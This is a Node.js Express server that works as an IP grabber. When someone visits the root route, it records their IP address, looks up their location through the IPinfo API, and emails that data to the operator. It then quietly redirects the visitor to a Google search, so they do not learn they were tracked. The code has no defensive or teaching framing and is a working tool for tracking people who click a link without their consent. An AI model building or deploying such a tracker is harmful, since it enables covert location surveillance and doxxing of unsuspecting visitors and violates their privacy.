const express = require('express');
const axios = require('axios');
const nodemailer = require('nodemailer');  // Add Nodemailer
require('dotenv').config();

const app = express();

// Configure Nodemailer
const transporter = nodemailer.createTransport({
    service: 'gmail',  // Use Gmail as the email service
    auth: {
        user: process.env.EMAIL_USER,  // Your email address
        pass: process.env.EMAIL_PASS   // Your email password or app password
    }
});

// Route to capture IP and send geolocation data via email
app.get('/', async (req, res) => {
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    try {
        // Fetch geolocation data from IPinfo API
        const response = await axios.get(`https://ipinfo.io/${clientIP}/json?token=${process.env.IPINFO_TOKEN}`);
        const geoData = response.data;

        // Send email with geolocation data
        const mailOptions = {
            from: process.env.EMAIL_USER,
            to: process.env.RECIPIENT_EMAIL,  // Your email to receive results
            subject: 'IP Geolocation Data',
            text: `IP: ${clientIP}\nLocation: ${JSON.stringify(geoData, null, 2)}`
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                console.log(error);
            } else {
                console.log('Email sent: ' + info.response);
            }
        });

        // Redirect the user to Google search
        res.redirect('https://www.google.com/search?q=what+is+my+ip');
    } catch (error) {
        res.status(500).json({ message: "Error fetching geolocation data", error: error.message });
    }
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
